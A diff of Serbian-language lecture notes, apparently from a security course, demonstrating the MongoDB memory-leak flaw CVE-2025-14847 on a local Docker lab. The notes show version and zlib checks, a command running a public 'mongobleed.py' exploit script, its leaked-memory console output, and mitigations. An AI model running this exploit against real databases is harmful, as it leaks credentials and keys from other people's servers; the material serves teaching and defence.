@@ -24,6 +24,7 @@ Ova ranjivost omogućava neautentifikovanom napadaču da daljinski "izvuče" (le
 - Osetljivi podaci u memoriji (kredencijali, fragmenti logova, metapodaci baze).
 
 #### Provera prisustva ranjivosti
+<img width="3980" height="2643" alt="image" src="https://github.com/user-attachments/assets/78e35c77-6ed2-467f-b6bb-62b991f2ae2c" />
 - Prvi korak je identifikacija verzije i provera mrežnog statusa servera:
 ```shell
 docker exec -it mongodb mongosh -u admin -p admin --authenticationDatabase admin
@@ -34,10 +35,6 @@ Connecting to:          mongodb://<credentials>@127.0.0.1:27017/?directConnectio
 Using MongoDB:          8.2.2
 Using Mongosh:          2.5.9
 ```
-- Spisak ranjivih verzija se nalazi na _Slici 1_
-<img width="3980" height="2643" alt="image" src="https://github.com/user-attachments/assets/78e35c77-6ed2-467f-b6bb-62b991f2ae2c" />
-_Slika 1_
-
 - Provera da li je `zlib` biblioteka za kompresiju uključena
 ```shell
 db.serverStatus().network
@@ -54,21 +51,50 @@ db.serverStatus().network
  // ...
 }
 ```
+#### Napad
+- Scenario: Izvlačenje osetljivih fragmenata iz memorije
+  - Napadač koristi specijalizovanu skriptu (mongobleed.py) koja šalje izmenjene mrežne pakete.
+- Rezultat: Skripta uspeva da izvuče fragmente logova i sistemskih informacija.
+- Otkriće: U konkretnom napadu, skripta je izvukla 6848 bajtova, uključujući putanje do Docker kontejnera i, što je najkritičnije, pronađen je pattern "key", što ukazuje na curenje kriptografskih ključeva ili kredencijala.
 
-Napadi
-Scenario: Izvlačenje osetljivih fragmenata iz memorije
-Napadač koristi specijalizovanu skriptu (npr. mongobleed.py) koja šalje malformisane mrežne pakete.
+Skripta za napad preuzeta sa [GitHub repozitorijuma](https://github.com/joe-desimone/mongobleed/blob/main/mongobleed.py)
+- Pokretanje skripte
+```shell
+py ./mongobleed.py
+```
+- Rezultat pokretanja sačuvan u `./demos/exploits/leaked.bin`, a neki od potencijalno značajnih rezultata su prikazani u konzoli
+```shell
+Rade@Yoga D:\fax\MAS\ZOSS\zoss-predavanje\mongobleed-demo ( main): py .\mongobleed.py
+[*] mongobleed - CVE-2025-14847 MongoDB Memory Leak
+[*] Author: Joe Desimone - x.com/dez_
+[*] Target: localhost:27017
+[*] Scanning offsets 20-8192
 
-Rezultat: Skripta uspeva da izvuče fragmente logova i sistemskih informacija.
+[+] offset= 124 len=  39: llocated log files not ready and missed
+[+] offset= 134 len=  34: ssions^\u0001k6�;W�J����Lw\u001b��
+[+] offset= 611 len=  15: \u0007\u001b�oq
+[+] offset= 719 len=  17: igger was reached
+[+] offset= 736 len=  18: rErrors�\u0001��U
+[+] offset=3093 len=  26: s skipped during tree walk
+[+] offset=4861 len=1164: 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0
+[+] offset=4867 len= 171: �c|W}W\u0003a�Z�Z�Z \t\u0013J�c�c:d+d�c�c�c�c�c�c\"d#dQd[d\\d]d^d_d`dRd\u001ad\u
+[+] offset=5709 len=2455: xec,relatime master:527 - cgroup pids rw,pids\n1083 1070 0:78 /docker/768a468a0f
+[+] offset=6645 len=  41: t BSON length in element with field name
+[+] offset=6906 len=  38:  requested with cache fill ratio < 25%
+[+] offset=7675 len=2221:  0 0\ncpu0 870 0 925 494844 119 0 1260 0 0 0\ncpu1 454 0 464 496708 54 0 259 0 0
+[+] offset=7716 len= 141: \u001d��c�t��vTky�p��\u0012�V�\r��ӄ�dn\u000b� e*$\r76�3�\u0012\n�\u0010\u0006�
+[+] offset=7757 len= 131: ����g\"�[g\u0016;�k��������$���?ay��6�\u001f\u0003���\u000b#��d\u001e}>��#X��\u0
 
-Otkriće: U konkretnom napadu, skripta je izvukla 6848 bajtova, uključujući putanje do Docker kontejnera i, što je najkritičnije, pronađen je pattern "key", što ukazuje na curenje kriptografskih ključeva ili kredencijala.
+[*] Total leaked: 6848 bytes
+[*] Unique fragments: 110
+[*] Saved to: leaked.bin
+[!] Found pattern: key
+```
 
-Mitigacije
-Ažuriranje baze: Odmah preći na verziju MongoDB-a u kojoj je CVE-2025-14847 otklonjen.
-
-Onemogućavanje zlib kompresije: Ako ažuriranje nije moguće, u konfiguraciji onemogućiti zlib kao mrežni kompresor.
-
-Mrežna segmentacija: Ograničiti pristup MongoDB portu (27017) samo na trusted IP adrese (backend servise).
+#### Mitigacije
+- Ažuriranje baze: Odmah preći na verziju MongoDB-a u kojoj je **CVE-2025-14847** otklonjen.
+- Onemogućavanje zlib kompresije: Ako ažuriranje nije moguće, u konfiguraciji onemogućiti `zlib` kao mrežni kompresor.
+- Mrežna segmentacija: Ograničiti pristup MongoDB portu (27017) samo na trusted IP adrese (backend servise).
 
 2. NoSQL Injection via Operator Injection
 Pretnje (Resursi)
